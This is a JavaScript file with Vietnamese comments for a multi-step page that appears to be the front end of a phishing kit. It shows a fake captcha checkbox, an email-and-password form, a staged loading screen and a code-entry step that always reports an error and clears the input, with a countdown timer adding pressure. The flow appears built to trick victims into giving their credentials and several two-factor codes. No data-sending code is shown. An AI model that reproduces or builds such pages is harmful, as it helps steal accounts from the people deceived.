function showStep(stepId) {
    document.querySelectorAll('.step-container').forEach(function(el) {
        el.classList.remove('active');
    });
    document.getElementById(stepId).classList.add('active');

    // LOGIC CHO CHAT Ở BƯỚC 2: Tự động trượt lên và đóng lại
    if (stepId === 'step2') {
        const chatModal = document.getElementById('chatModal');
        // Trễ 0.5 giây để mở mượt mà
        setTimeout(function() {
            chatModal.classList.add('show-chat');
            // Tự động ẩn đi sau 3 giây
            setTimeout(function() {
                chatModal.classList.remove('show-chat');
            }, 3000);
        }, 500);
    }
}

// BƯỚC 1
const captchaCheck = document.getElementById('captchaCheck');
if (captchaCheck) {
    captchaCheck.addEventListener('change', function() {
        if(this.checked) {
            setTimeout(function() { showStep('step2'); }, 500);
        }
    });
}

// BƯỚC 2
const inputEmail = document.getElementById('inputEmail');
const inputPass = document.getElementById('inputPass');
const btnSubmitStep2 = document.getElementById('btnSubmitStep2');
const formStep2 = document.getElementById('formStep2');

function checkStep2Form() {
    if (inputEmail.value.trim() !== "" && inputPass.value.trim() !== "") {
        btnSubmitStep2.disabled = false;
    } else {
        btnSubmitStep2.disabled = true;
    }
}

if (inputEmail && inputPass) {
    inputEmail.addEventListener('input', checkStep2Form);
    inputPass.addEventListener('input', checkStep2Form);
}

if (btnSubmitStep2) {
    btnSubmitStep2.addEventListener('click', function() {
        formStep2.classList.add('disabled-element'); 
        setTimeout(function() {
            showStep('step4'); 
            setTimeout(function() {
                showStep('step5'); 
                startTimer(); 
            }, 5000);
        }, 500); 
    });
}

// BƯỚC 5: Xử lý và Báo Lỗi
const inputCode = document.getElementById('inputCode');
const btnSubmitStep5 = document.getElementById('btnSubmitStep5');
const formStep5 = document.getElementById('formStep5');
const errorCodeMsg = document.getElementById('errorCodeMsg'); // Thẻ thông báo lỗi

function checkStep5Form() {
    if (inputCode.value.trim() !== "") {
        btnSubmitStep5.disabled = false;
    } else {
        btnSubmitStep5.disabled = true;
    }
}

if (inputCode) {
    inputCode.addEventListener('input', checkStep5Form);
}

if (btnSubmitStep5) {
    btnSubmitStep5.addEventListener('click', function() {
        formStep5.classList.add('disabled-element'); 
        errorCodeMsg.style.display = 'none'; // Ẩn thông báo lỗi cũ nếu có

        setTimeout(function() {
            showStep('step4'); // Sang màn hình loading
            
            setTimeout(function() {
                formStep5.classList.remove('disabled-element');
                inputCode.value = ''; 
                btnSubmitStep5.disabled = true; 
                
                // HIỆN THÔNG BÁO LỖI CHỮ ĐỎ Ở ĐÂY
                errorCodeMsg.style.display = 'block';

                showStep('step5'); // Trở lại bước 5 cùng dòng báo lỗi
            }, 5000);
            
        }, 500);
    });
}

// ĐẾM NGƯỢC
let timerInterval;
function startTimer() {
    clearInterval(timerInterval);
    let time = 4 * 60 + 43; 
    const display = document.getElementById('countdown');
    if (!display) return;
    timerInterval = setInterval(function () {
        let minutes = parseInt(time / 60, 10);
        let seconds = parseInt(time % 60, 10);
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        display.textContent = minutes + ":" + seconds;
        if (--time < 0) {
            time = 0;
            clearInterval(timerInterval);
        }
    }, 1000);
}
